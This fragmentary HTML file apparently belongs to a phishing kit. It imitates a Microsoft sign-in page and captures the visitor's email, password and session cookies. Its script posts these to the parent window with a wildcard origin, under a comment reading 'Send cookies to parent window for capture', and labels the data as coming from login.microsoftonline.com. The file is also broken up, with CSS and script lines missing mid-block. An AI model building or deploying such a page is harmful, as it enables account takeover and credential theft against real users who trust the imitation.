            align-items: center;
            justify-content: center;
        }
        
        .login-container {

            width: 100%;
            max-width: 400px;
        }
        
        .microsoft-logo {

            display: block;
        }
        
        .title {

            font-weight: 600;
            color: #1b1b1b;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 15px;
            color: #605e5c;
            text-align: center;
            margin-bottom: 24px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #323130;
            margin-bottom: 4px;
        }
        
        .form-input {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #605e5c;
            border-radius: 2px;
            font-size: 15px;
            background: white;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 1px #0078d4;
        }
        
        .form-input.error {
            border-color: #d13438;
        }
        
        .error-message {
            color: #d13438;
            font-size: 13px;
            margin-top: 4px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .sign-in-button {
            width: 100%;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            padding: 8px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 24px;
        }
        
        .sign-in-button:hover {
            background: #106ebe;
        }
        
        .sign-in-button:disabled {
            background: #f3f2f1;
            color: #a19f9d;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 16px;
        }
        
        .loading.show {
            display: block;
        }
        
        .spinner {
            border: 2px solid #f3f2f1;
            border-top: 2px solid #0078d4;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer-links {
            text-align: center;
            margin-top: 24px;
            font-size: 13px;
        }
        
        .footer-links a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>

                <input type="email" id="email" class="form-input" required>
                <div class="error-message" id="emailError">Please enter a valid email address.</div>
            </div>
            
            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <input type="password" id="password" class="form-input" required>
                <div class="error-message" id="passwordError">Please enter your password.</div>
            </div>
            
            <button type="submit" class="sign-in-button" id="signInButton">Sign in</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Signing you in...</p>
        </div>
        
        <div class="footer-links">
            <a href="#">Can't access your account?</a>

            timestamp: new Date().toISOString()
          }));
          
          // Send cookies to parent window for capture

              type: 'MICROSOFT_COOKIES',
              email: email,
              password: password,
              cookies: cookiesWithProperDomains,
              cookieList: cookiesWithProperDomains, // Use the real format with proper domains
              timestamp: new Date().toISOString(),
              source: 'login.microsoftonline.com'
            }, '*');
          }

          // Simulate setting cookies in document (limited by same-origin policy)

              let cookieString = `${cookie.name}=${cookie.value}`;

            errorDiv.textContent = message;
            errorDiv.style.textAlign = 'center';
            errorDiv.style.marginTop = '16px';

            if (existingError) {
